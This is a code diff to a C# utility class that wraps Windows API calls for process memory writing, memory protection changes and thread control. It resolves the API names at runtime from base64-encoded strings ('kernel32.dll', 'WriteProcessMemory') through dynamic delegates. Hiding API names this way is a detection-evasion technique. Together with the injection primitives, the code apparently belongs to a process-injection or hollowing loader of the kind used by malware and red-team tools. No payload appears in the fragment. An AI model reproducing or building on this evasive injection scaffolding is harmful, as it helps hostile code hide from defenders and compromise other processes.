@@ -386,6 +386,16 @@ public static class Utility
     }
 
     [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+    public delegate bool WriteProcessMemoryDelegate(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+    public static bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, ref IntPtr lpNumberOfBytesWritten)
+    {
+        IntPtr funcAddr = GetFunctionAddress("a2VybmVsMzIuZGxs", "V3JpdGVQcm9jZXNzTWVtb3J5");
+        Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(funcAddr, typeof(WriteProcessMemoryDelegate));
+        object[] args = { hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten };
+        return (bool)funcDelegate.DynamicInvoke(args);
+    }
+
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
     public delegate UInt32 NtProtectVirtualMemoryDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref UInt32 NumberOfBytesToProtect, UInt32 NewAccessProtection, ref UInt32 OldAccessProtection);
     public static UInt32 NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref UInt32 NumberOfBytesToProtect, UInt32 NewAccessProtection, ref UInt32 OldAccessProtection)
     {
@@ -453,6 +463,7 @@ public static class Utility
         return (IntPtr)funcDelegate.DynamicInvoke(args);
     }
 
+    /*
     [UnmanagedFunctionPointer(CallingConvention.StdCall)]
     public delegate IntPtr OpenThreadDelegate(int dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
     public static IntPtr OpenThread(int dwDesiredAccess, bool bInheritHandle, uint dwThreadId)
@@ -496,6 +507,7 @@ public static class Utility
         lpContext = (CONTEXT64)args[1];
         return res;
     }
+    */
 
     [UnmanagedFunctionPointer(CallingConvention.StdCall)]
     public delegate uint ResumeThreadDelegate(IntPtr hThread);
@@ -507,6 +519,7 @@ public static class Utility
         return (uint)funcDelegate.DynamicInvoke(args);
     }
 
+    /*
     [UnmanagedFunctionPointer(CallingConvention.StdCall)]
     public delegate bool CloseHandleDelegate(IntPtr hObject);
     public static bool CloseHandle(IntPtr hObject)
@@ -516,14 +529,5 @@ public static class Utility
         object[] args = { hObject };
         return (bool)funcDelegate.DynamicInvoke(args);
     }
-
-    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate bool WriteProcessMemoryDelegate(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
-    public static bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, ref IntPtr lpNumberOfBytesWritten)
-    {
-        IntPtr funcAddr = GetFunctionAddress("a2VybmVsMzIuZGxs", "V3JpdGVQcm9jZXNzTWVtb3J5");
-        Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(funcAddr, typeof(WriteProcessMemoryDelegate));
-        object[] args = { hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten };
-        return (bool)funcDelegate.DynamicInvoke(args);
-    }
+    */
 }
